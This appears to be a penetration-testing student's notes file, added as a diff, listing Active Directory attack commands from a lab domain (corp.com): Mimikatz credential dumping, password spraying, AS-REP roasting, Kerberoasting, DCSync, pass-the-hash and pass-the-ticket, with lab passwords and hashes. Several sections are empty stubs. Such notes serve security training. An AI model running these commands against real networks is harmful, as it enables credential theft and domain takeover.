@@ -1,0 +1,352 @@
+xfreerdp /u:stephanie /d:corp.com /v:192.168.201.75 /p:LegmanTeamBenzoin\!\!
+
+xfreerdp /u:offsec /d:corp.com /v:192.168.239.76 /p:lab
+
+xfreerdp /u:jeffadmin /d:corp.com /v:192.168.201.75 /p:BrouhahaTungPerorateBroom2023\!
+
+rdesktop 192.168.222.74 -u offsec -p lab -d corp.com -g 90%
+
+-------------------------------------------------------------------------------------
+net user /domain
+
+net user jeffadmin /domain
+
+net group /domain
+
+net group "Sales Department" /domain
+
+-------------------------------------------------------------------------------------
+
+Manual Enumeration
+
+powershell -ep bypass
+
+Import-Module .\Powerview.ps1
+
+Get-NetDomain
+
+Get-NetUser
+
+Get-NetUser | select cn
+
+Get-NetUser | select cn,pwdlastset,lastlogon
+
+Get-NetGroup | select cn
+
+Get-NetGroup "Sales Deapartment" | select member
+
+Get-NetComputer
+
+Get-NetComputer | select operatingsystem,dnshostname
+
+Find-LocalAdminAccess                                                --> tells if current user have administrative privileges on any other computer.
+
+Get-NetSession -ComputerName files04                                 --> tells if there are any logged in users in files04 computer, to execute this command current user should be local admin on that computer.
+
+.\PsLoggedon.exe \\computer_name                                     --> fetches logged on users in the particular computer
+
+setspan -L iis_service                                               --> Listing SPN linked to a certain user account
+  
+Get-NetUser -SPN | select samaccountname,serviceprincipalname        -->   Listing the SPN accounts in the domain
+
+nslookup.exe web04.corp.com                                          --> Resolving the web04.corp.com name
+
+Get-ObjectAcl -Identity Username                                     --> enumerates ACE (Access Control Entries)
+
+Convert-SidToName  SID                                               --> Converts the ObjectISD into name
+
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights   --> lists all the SID's with GenericAll permission
+
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName    c
+
+net group "Management Department" stephanie /add /domain            --> Add stephaine to  "Management Department"  group.
+
+Find-DomainShare                                                    --> lists all the shares in the domain
+
+Find-DomainShare  -CheckShareAccess                                 --> lists all the shares available to particular user.
+
+ls \\dc1.corp.com\sysvol\corp.com\                                  --> Listing contents of the SYSVOL share
+
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"           --> To decrypt the password
+
+ls \\FILES04\docshare                                               --> Listing the contents of docsare
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Automated Enumeration
+
+Import-Module .\Sharphound.ps1                                      --> Importing the SharpHound script to memory
+
+Get-Help Invoke-BloodHound                                          --> Checking the SharpHound options
+
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"            -->Running SharpHound to collect domain data
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Mimikatz command
+
+.\mimikatz.exe
+
+privilege::debug               --> enabling SeDebugPrivilege,  which will allow us to interact with a process owned by another account.
+
+sekurlsa::logonpasswords       --> dumps the credentials of all logged-on users
+
+dir \\web04.corp.com\backup    --> for getting TGS and TGT tickets
+
+sekurlsa::tickets              --> Extracting Kerberos tickets with mimikatz
+
+Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Performing Attacks on Active Directory Authentication
+
+Password Attacks
+AS-REP Roasting
+Kerberoasting
+Domain Controller Synchronization
+Silver Tickets
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Password Attacks
+
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin                                                      --> password spraying using spray-passwords script
+
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+crackmapexec smb 192.168.201.75 -u pete -p 'Nexus123!' -d corp.com                                --> Using crackmapexec to attack user accounts
+
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"                --> Using kerbrute to attack user accounts
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+AS-REP Roasting
+
+Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. 
+After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. 
+This attack is known as AS-REP Roasting.
+
+
+impacket-GetNPUsers -dc-ip 192.168.201.70  -request -outputfile hashes.asreproast corp.com/pete                                      --> fetches AS-REP hash
+
+impacket-GetNPUsers -dc-ip domaincontrollerip  -request -outputfile hashes.asreproast corp.com/pete
+
+.\Rubeus.exe asreproast /nowrap                                                                                                      --> fetches AS-REP hash
+
+hashcat --help | grep -i "Kerberos"                                                                                                  --> obtaining the correct mode for Hashcat
+
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force             --> cracks the AS-REP hash
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Kerberoasting
+
+We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. 
+The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
+
+When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
+
+These checks are performed as a second step only when connecting to the service itself. 
+This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.
+
+The service ticket is encrypted using the SPN's password hash. 
+If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. 
+This technique is known as Kerberoasting.
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast                                                                                     --> obtain TGS-REP hash
+
+hashcat --help | grep -i "Kerberos"                                                                                                    --> Reviewing the correct Hashcat mode
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force               --> cracking the TGS-REP hash
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.201.70 corp.com/pete                                                                  --> Using impacket-GetUserSPNs to perform Kerberoasting on Linux
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Domain Controller Synchronization
+
+In production environments, domains typically rely on more than one domain controller to provide redundancy. 
+The Directory Replication Service (DRS) Remote Protocol1 uses replication to synchronize these redundant domain controllers. 
+A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.
+
+Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. 
+Instead, it only verifies that the associated SID has appropriate privileges. 
+If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
+
+To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. 
+By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+
+If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. 
+This allows us to request any user credentials from the domain.
+
+
+.\mimikatz.exe
+
+lsadump::dcsync /user:corp\dave                                                                                                              --> Using Mimikatz to perform a dcsync attack to obtain the credentials of dave
+
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force                               --> Using Hashcat to crack the NTLM hash obtained by the dcsync attack
+
+lsadump::dcsync /user:corp\Administrator                                                                                                     --> Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator
+
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70                                   --> Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Silver Tickets
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Lateral Movement Techniques
+
+PsExec
+
+PsExec provides remote execution of processes on other systems through an interactive console.
+
+To achieve the above, a few requisites must be met. To begin, the user that authenticates to the target machine needs to be part of the Administrators local group. 
+In addition, the ADMIN$ share must be available and File and Printer Sharing has to be turned on. 
+Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.
+
+In order to execute the command remotely, PsExec performs the following tasks:
+Writes psexesvc.exe into the C:\Windows directory
+Creates and spawns a service on the remote host
+Runs the requested program/command as a child process of psexesvc.exe
+
+
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd                      -->           Obtaining an Interactive Shell on the Target System with PsExec
+
+./PsExec64.exe -i  \\hostname -u domain\user -p password cmd
+
+python psexec.py corp/jen:Nexus123\!@192.168.239.72
+
+python psexec.py domain/user:password@ipaddress
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Lateral Movement Techniques
+
+Pass the Hash
+
+The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. 
+Note that this will not work for Kerberos authentication but only for servers or services using NTLM authentication. 
+This lateral movement sub-technique is also mapped in the MITRE Framework under the Use Alternate Authentication Material general technique.
+
+Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including PsExec from Metasploit, Passing-the-hash toolkit, and Impacket.
+The mechanics behind them are more or less the same in that the attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash.
+
+Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port 445) and the Windows File and Printer Sharing feature to be enabled.
+This lateral movement technique also requires the admin share called ADMIN$ to be available
+
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73                   -->            Passing the hash using Impacket wmiexec
+
+python3 psexec.py -hashes emptyhash:hash user@ip
+
+evil-winrm -i 192.168.233.72 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Lateral Movement Techniques
+
+Overpass the Hash
+
+With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
+
+
+privilege::debug
+sekurlsa::logonpasswords                                        -->          Dumping password hash for other users
+
+The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.
+
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell                       -->    Creating a process with a different users NTLM password hash
+
+Note:
+At this point, running the whoami command on the newly created PowerShell session would show current user's identity instead of the user for whom we got the NTLM hash. 
+While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and it does not inspect any imported kerberos tickets
+
+net use \\files04
+klist                                                                                                                 -->    Mapping a network share on a remote server and listing Kerberos tickets
+
+We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.
+
+PsExec can run a command remotely but does not accept password hashes. 
+Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we may reuse the TGT to obtain code execution on the files04 host.
+
+.\PsExec.exe \\files04 cmd          -->   Opening remote connection using Kerberos
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Lateral Movement Techniques
+
+Pass the Ticket
+
+In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. 
+We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.
+
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. 
+In addition, if the service tickets belong to the current user, then no administrative privileges are required.
+
+privilege::debug
+sekurlsa::tickets /export                                -->          Exporting Kerberos TGT/TGS to disk
+
+The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format.
+
+--------------
+dir *.kirbi                                              -->          Exporting Kerberos TGT/TGS to disk
+
+
+  Directory: C:\Tools
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+---------------
+
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi           -->          Injecting the selected TGS into process memory.
+
+klist                                                                -->          Inspecting the injected ticket in memory
+
+ls \\web04\backup                                                    -->          Accessing the shared folder through the injected ticket for which we did not had accesss.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Lateral Movement Techniques
+
+DCOM
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Active Directory Persistence
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
